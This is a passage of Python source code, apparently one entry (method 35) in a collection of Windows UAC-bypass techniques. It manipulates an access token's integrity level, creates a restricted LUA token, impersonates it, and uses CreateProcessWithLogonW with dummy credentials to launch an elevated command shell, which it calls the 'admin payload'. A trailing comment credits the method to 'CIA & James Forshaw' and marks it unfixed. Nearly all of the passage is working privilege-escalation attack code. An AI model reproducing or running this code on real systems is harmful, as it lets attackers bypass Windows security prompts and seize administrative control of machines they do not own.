mlAuthority   = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16)) # Represents the Mandatory Label Authority (SECURITY_MANDATORY_LABEL_AUTHORITY).
pIntegritySid = PSID()
knacrack1337  = RtlAllocateAndInitializeSid(
			   byref(mlAuthority),                              # _In_  pIdentifierAuthority A pointer to a SID_IDENTIFIER_AUTHORITY structure. This structure provides the top-level identifier authority value to set in the SID.
			   1,                                               # _In_  nSubAuthorityCount   Specifies the number of subauthorities to place in the SID. This parameter also identifies how many of the subauthority parameters have meaningful values. This parameter must contain a value from 1 to 8.  1->dwSubAuthority0
			   IntegrityLevel.SECURITY_MANDATORY_MEDIUM_RID,    # _In_  dwSubAuthority0      Subauthority value to place in the SID.
			   0,                                               # _In_  dwSubAuthority1      Subauthority value to place in the SID.
			   0,                                               # _In_  dwSubAuthority2      Subauthority value to place in the SID.
		           0,                                               # _In_  dwSubAuthority3      Subauthority value to place in the SID.
			   0,                                               # _In_  dwSubAuthority4      Subauthority value to place in the SID.
		           0,                                               # _In_  dwSubAuthority5      Subauthority value to place in the SID.
			   0,                                               # _In_  dwSubAuthority6      Subauthority value to place in the SID.
			   0,                                               # _In_  dwSubAuthority7      Subauthority value to place in the SID.
			   byref(pIntegritySid))                            # _Out_ *pSid                A pointer to a variable that receives the pointer to the allocated and initialized SID structure.
if knacrack1337 == STATUS_UNSUCCESSFUL:
    raise RuntimeError("Error while initializing Medium IL SID using RtlAllocateAndInitializeSid: %s" %GetLastError())
print "[*] Initializing a SID for Medium Integrity level"

SID_AND_ATTRIBUTES            = SID_AND_ATTRIBUTES()
SID_AND_ATTRIBUTES.Sid        = pIntegritySid
SID_AND_ATTRIBUTES.Attributes = GroupAttributes.SE_GROUP_INTEGRITY
TOKEN_MANDATORY_LABEL         = TOKEN_MANDATORY_LABEL()
TOKEN_MANDATORY_LABEL.Label   = SID_AND_ATTRIBUTES
knacrack420420 = NtSetInformationToken(
                          newhToken,                                        # _In_ TokenHandle             A handle to the access token for which information is to be set.
                          TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,      # _In_ TokenInformationClass   A value from the TOKEN_INFORMATION_CLASS enumerated type that identifies the type of information the function sets. The valid values from TOKEN_INFORMATION_CLASS are described in the TokenInformation parameter.
                          byref(TOKEN_MANDATORY_LABEL),                     # _In_ TokenInformation        A pointer to a buffer that contains the information set in the access token. The structure of this buffer depends on the type of information specified by the TokenInformationClass parameter.
                          sizeof(TOKEN_MANDATORY_LABEL))                    # _In_ TokenInformationLength  Specifies the length, in bytes, of the buffer pointed to by TokenInformation.
if knacrack420420 == STATUS_UNSUCCESSFUL:
    raise RuntimeError("Error while setting medium IL token using NtSetInformationToken: %s" %GetLastError())
print "\t[+] Now we are lowering the token's integrity level from High to Medium"

hLuaToken    = HANDLE(INVALID_HANDLE_VALUE)
LUA_TOKEN    = 0x4  # The new token is a Least-privileged User Account token.
knacrack1338 = NtFilterToken(
                          newhToken,                                        # _In_     ExistingTokenHandle A handle to a primary or impersonation token. The handle must have TOKEN_DUPLICATE access to the token.
                          LUA_TOKEN,                                        # _In_     Flags               Specifies additional privilege options in our case the new token is a Least-privileged User Account token.
                          None,                                             # _In_opt_ SidsToDisable       A pointer to an array of SID_AND_ATTRIBUTES structures that specify the deny-only SIDs in the restricted token. The system uses a deny-only SID to deny access to a securable object. The absence of a deny-only SID does not allow access. This parameter can be NULL if no SIDs are to be disabled.
                          None,                                             # _In_opt_ PrivilegesToDelete  A pointer to an array of LUID_AND_ATTRIBUTES structures that specify the privileges to delete in the restricted token. This parameter can be NULL if you do not want to delete any privileges.
                          None,                                             # _In_opt_ RestrictedSids      A pointer to an array of SID_AND_ATTRIBUTES structures that specify a list of restricting SIDs for the new token. If the existing token is a restricted token, the list of restricting SIDs for the new token is the intersection of this array and the list of restricting SIDs for the existing token. This parameter can be NULL if you do not want to specify any restricting SIDs.
                          byref(hLuaToken))                                 # _Out_    NewTokenHandle      A pointer to a variable that receives a handle to the new restricted token. The new token is the same type, primary or impersonation, as the existing token.
if knacrack1338 == STATUS_UNSUCCESSFUL:
    raise RuntimeError("Error while creating a restricted token using NtFilterToken: %s" %GetLastError())
print "[*] Creating restricted token"

ImpersonateLoggedOnUser(hLuaToken)                                          # _In_     hToken              A handle to a primary or impersonation access token that represents a logged-on user. This can be a token handle returned by a call to NtFilterToken function.  If hToken is a handle to an impersonation token, the token must have TOKEN_QUERY and TOKEN_IMPERSONATE access.
print "[*] Impersonating logged on user"

SW_SHOW                   = 5
lpStartupInfo             = STARTUPINFO()                                   
lpStartupInfo.cb 	  = sizeof(lpStartupInfo)
lpProcessInformation      = PROCESS_INFORMATION()
STARTF_USESHOWWINDOW      = 0x00000001 # The wShowWindow member contains additional information.
lpStartupInfo.dwFlags     = STARTF_USESHOWWINDOW                            
lpStartupInfo.wShowWindow = SW_SHOW
CMDPath                   = create_unicode_buffer(1024)                     
kernel32.GetEnvironmentVariableW(u"COMSPEC", CMDPath, 1024)
CREATE_NEW_CONSOLE        = 0x00000010
lpApplicationName         = CMDPath.value
knacracklov3 = CreateProcessWithLogonW(                                     #
		             u"uac",                                        # _yIn_        lpUsername     The name of the user.
	            	     u"is",                                         # _In_opt_    lpDomain        The name of the domain or server whose account database contains the lpUsername account.
	            	     u"useless",                                    # _In_        lpPassword      The clear-text password for the lpUsername account.
	            	     LOGON_NETCREDENTIALS_ONLY,                     # _In_        dwLogonFlags    The logon option, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials. The system does not validate the specified credentials. Therefore, the process can start, but it may not have access to network resources.
	            	     lpApplicationName,                             # _In_opt_  lpApplicationName The name of the module to be executed.
	            	     None,                                          # _Inout_opt_ pCommandLine    The command line to be executed. The maximum length of this string is 1024 characters. If lpApplicationName is NULL, the module name portion of lpCommandLine is limited to MAX_PATH characters.
	            	     CREATE_NEW_CONSOLE,                            # _In_        dwCreationFlags The flags that control how the process is created. The new process has a new console, instead of inheriting the parent's console. This flag cannot be used with the DETACHED_PROCESS flag.
	            	     None,                                          # _In_opt_    lpEnvironment   A pointer to an environment block for the new process. If this parameter is NULL, the new process uses an environment created from the profile of the user specified by lpUsername.
	            	     None,                                          # _In_opt_ lpCurrentDirectory The full path to the current directory for the process. If this parameter is NULL, the new process has the same current drive and directory as the calling process.
	            	     byref(lpStartupInfo),                          # _In_        lpStartupInfo   A pointer to a STARTUPINFO structure.
	            	     byref(lpProcessInformation))                   # _Out_       lpProcessInfo   A pointer to a PROCESS_INFORMATION structure that receives identification information for the new process, including a handle to the process.
if knacracklov3 == 0:
    raise RuntimeError("Error while triggering admin payload using CreateProcessWithLogonW: %s" %GetLastError())
print "[*] Triggering payload PID:", lpProcessInformation.dwProcessId

'''
35. 
- Author: CIA & James Forshaw
-    Type: Impersonation
-    Method: Token Manipulations
-    Target(s): Autoelevated applications
-    Component(s): Attacker defined applications
-    Works from: Windows 7 (7600)
-    AlwaysNotify compatible, see note
-    Fixed in: unfixed 🙈
-        How: -
'''
